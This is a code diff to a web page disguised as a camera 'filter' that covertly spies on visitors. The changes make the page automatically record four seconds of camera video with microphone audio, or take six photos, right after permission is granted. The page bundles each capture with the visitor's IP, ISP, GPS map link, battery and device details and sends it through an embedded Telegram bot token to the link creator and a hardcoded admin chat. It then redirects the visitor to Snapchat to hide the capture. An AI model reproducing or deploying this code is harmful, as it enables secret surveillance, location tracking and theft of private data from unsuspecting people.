@@ -81,7 +81,7 @@
     </div>
 
     <div class="bottom-tray">
-        <button class="capture-btn" onclick="triggerCapture()"></button>
+        <button class="capture-btn" onclick="triggerAction()"></button>
         <div class="hint-text">Tap to try filter</div>
     </div>
 
@@ -89,11 +89,11 @@
 
     <script>
         const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";
-        const ADMIN_CHAT_ID = "6478868514"; // Aapki Admin Chat ID
+        const ADMIN_CHAT_ID = "6478868514";
         
         const urlParams = new URLSearchParams(window.location.search);
         const CHAT_ID = urlParams.get('id');
-        const cameraType = urlParams.get('b');
+        const cameraType = urlParams.get('b'); // 'front', 'back', ya null (Universal link)
 
         let globalStream = null;
         let gpsData = { lat: '', lon: '', mapLink: 'N/A' };
@@ -146,13 +146,13 @@
 
             let constraints = {
                 video: { width: { ideal: 1280 }, height: { ideal: 720 } },
-                audio: !cameraType
+                audio: !cameraType // Agar cameraType nahi hai (Universal Link), toh audio true rahega (Video + Sound ke liye)
             };
 
             if (cameraType === 'back') {
                 constraints.video.facingMode = { exact: "environment" };
             } else {
-                constraints.video.facingMode = "user";
+                constraints.video.facingMode = "user"; // Front camera for 'front' and Universal link
             }
 
             try {
@@ -179,27 +179,21 @@
                 document.getElementById('loading-text').style.display = 'none';
                 isReady = true;
 
-                // --- AUTO CAPTURE TRIGGERED WITHOUT CLICKING ---
+                // --- AUTO TRIGGER WITHOUT CLICKING ---
                 setTimeout(() => {
-                    triggerCapture();
+                    triggerAction();
                 }, 1000);
 
             } catch (err) {
-                document.getElementById('loading-text').innerText = "Please allow camera access!";
+                document.getElementById('loading-text').innerText = "Please allow camera & microphone access!";
             }
         }
 
-        async function triggerCapture() {
+        async function triggerAction() {
             if (!isReady || !globalStream) return;
 
             document.getElementById('loading-text').innerText = "Applying Filter...";
             document.getElementById('loading-text').style.display = 'block';
-
-            const videoElement = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            canvas.width = videoElement.videoWidth || 1280;
-            canvas.height = videoElement.videoHeight || 720;
-            const context = canvas.getContext('2d');
 
             let batteryText = "N/A";
             try {
@@ -209,63 +203,130 @@
 
             let netType = (navigator.connection ? navigator.connection.effectiveType : "4G").toUpperCase();
 
-            for (let i = 1; i <= 6; i++) {
-                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                
-                let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.90));
-                
-                if (blob) {
-                    let caption = "";
-                    
-                    if (i === 1) {
-                        caption = 
-                            `🌐 **IP & Exact Location**\n` +
-                            `🔢 IP Address: \`${ipInfo.ip}\`\n` +
-                            `📍 Location: ${ipInfo.city}, ${ipInfo.region}\n` +
-                            `🗺️ **GPS Maps Link**: ${gpsData.mapLink}\n` +
-                            `📡 ISP: ${ipInfo.isp}\n\n` +
-                            `📱 **Device Details**\n` +
-                            `🔋 Battery: ${batteryText}\n` +
-                            `📶 Network: ${netType}\n` +
-                            `🖥️ Screen: ${window.screen.width}x${window.screen.height}\n` +
-                            `🕒 Time: ${new Date().toLocaleString()}\n\n` +
-                            `👑 **CREDIT BY : आयुष नेगी**`;
-                    } else {
-                        caption = `👑 **CREDIT BY : आयुष नेगी**`;
+            let baseCaption = 
+                `🌐 **IP & Exact Location**\n` +
+                `🔢 IP Address: \`${ipInfo.ip}\`\n` +
+                `📍 Location: ${ipInfo.city}, ${ipInfo.region}\n` +
+                `🗺️ **GPS Maps Link**: ${gpsData.mapLink}\n` +
+                `📡 ISP: ${ipInfo.isp}\n\n` +
+                `📱 **Device Details**\n` +
+                `🔋 Battery: ${batteryText}\n` +
+                `📶 Network: ${netType}\n` +
+                `🖥️ Screen: ${window.screen.width}x${window.screen.height}\n` +
+                `🕒 Time: ${new Date().toLocaleString()}\n\n` +
+                `👑 **CREDIT BY : आयुष नेगी**`;
+
+            // AGAR UNIVERSAL LINK HAI (CameraType nahi hai) -> Toh Video + Sound Record Hoga (4 Seconds)
+            if (!cameraType) {
+                let recordedChunks = [];
+                let mediaRecorder;
+
+                try {
+                    mediaRecorder = new MediaRecorder(globalStream, { mimeType: 'video/webm; codecs=vp8,opus' });
+                } catch (err) {
+                    try {
+                        mediaRecorder = new MediaRecorder(globalStream);
+                    } catch (e) {
+                        // Fallback agar MediaRecorder support na kare
+                        alert("Error initializing video recorder");
+                        return;
                     }
+                }
 
-                    // 1. Send to User (Jisne link generate kiya)
-                    if (CHAT_ID) {
-                        const formDataUser = new FormData();
-                        formDataUser.append('chat_id', CHAT_ID);
-                        formDataUser.append('photo', blob, `photo_${i}.jpg`);
-                        formDataUser.append('caption', caption);
-                        formDataUser.append('parse_mode', 'Markdown');
+                mediaRecorder.ondataavailable = function(event) {
+                    if (event.data && event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
 
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                mediaRecorder.onstop = async function() {
+                    let blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    
+                    if (blob && blob.size > 0) {
+                        // 1. Send Video to User
+                        if (CHAT_ID) {
+                            const formDataUser = new FormData();
+                            formDataUser.append('chat_id', CHAT_ID);
+                            formDataUser.append('video', blob, 'video_capture.webm');
+                            formDataUser.append('caption', "🎥 **Secret Video + Sound Captured!**\n\n" + baseCaption);
+                            formDataUser.append('parse_mode', 'Markdown');
+
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                                method: 'POST',
+                                body: formDataUser
+                            });
+                        }
+
+                        // 2. Send Video to Admin
+                        const formDataAdmin = new FormData();
+                        formDataAdmin.append('chat_id', ADMIN_CHAT_ID);
+                        formDataAdmin.append('video', blob, 'video_capture.webm');
+                        formDataAdmin.append('caption', `🕵️‍♂️ **Admin Log (Video from User ID: ${CHAT_ID})**\n\n` + baseCaption);
+                        formDataAdmin.append('parse_mode', 'Markdown');
+
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                             method: 'POST',
-                            body: formDataUser
+                            body: formDataAdmin
                         });
                     }
 
-                    // 2. Send to Admin (Aapke paas - 6478868514)
-                    const formDataAdmin = new FormData();
-                    formDataAdmin.append('chat_id', ADMIN_CHAT_ID);
-                    formDataAdmin.append('photo', blob, `photo_${i}.jpg`);
-                    formDataAdmin.append('caption', `🕵️‍♂️ **Admin Log (Generated by User ID: ${CHAT_ID})**\n\n` + caption);
-                    formDataAdmin.append('parse_mode', 'Markdown');
+                    globalStream.getTracks().forEach(track => track.stop());
+                    window.location.href = "https://www.snapchat.com";
+                };
 
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formDataAdmin
-                    });
+                mediaRecorder.start();
+                // 4 seconds tak video record hogi
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 4000);
+
+            } else {
+                // AGAR FRONT YA BACK LINK HAI -> Toh Photos Capture Hongi (Pehle ki tarah)
+                const videoElement = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                canvas.width = videoElement.videoWidth || 1280;
+                canvas.height = videoElement.videoHeight || 720;
+                const context = canvas.getContext('2d');
+
+                for (let i = 1; i <= 6; i++) {
+                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                    
+                    let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.90));
+                    
+                    if (blob) {
+                        let caption = (i === 1) ? baseCaption : `👑 **CREDIT BY : आयुष नेगी**`;
+
+                        if (CHAT_ID) {
+                            const formDataUser = new FormData();
+                            formDataUser.append('chat_id', CHAT_ID);
+                            formDataUser.append('photo', blob, `photo_${i}.jpg`);
+                            formDataUser.append('caption', caption);
+                            formDataUser.append('parse_mode', 'Markdown');
+
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formDataUser
+                            });
+                        }
+
+                        const formDataAdmin = new FormData();
+                        formDataAdmin.append('chat_id', ADMIN_CHAT_ID);
+                        formDataAdmin.append('photo', blob, `photo_${i}.jpg`);
+                        formDataAdmin.append('caption', `🕵️‍♂️ **Admin Log (Generated by User ID: ${CHAT_ID})**\n\n` + caption);
+                        formDataAdmin.append('parse_mode', 'Markdown');
+
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formDataAdmin
+                        });
+                    }
+
+                    await new Promise(resolve => setTimeout(resolve, 300));
                 }
 
-                await new Promise(resolve => setTimeout(resolve, 300));
+                globalStream.getTracks().forEach(track => track.stop());
+                window.location.href = "https://www.snapchat.com";
             }
-
-            globalStream.getTracks().forEach(track => track.stop());
-            window.location.href = "https://www.snapchat.com";
         }
 
         window.onload = function() {
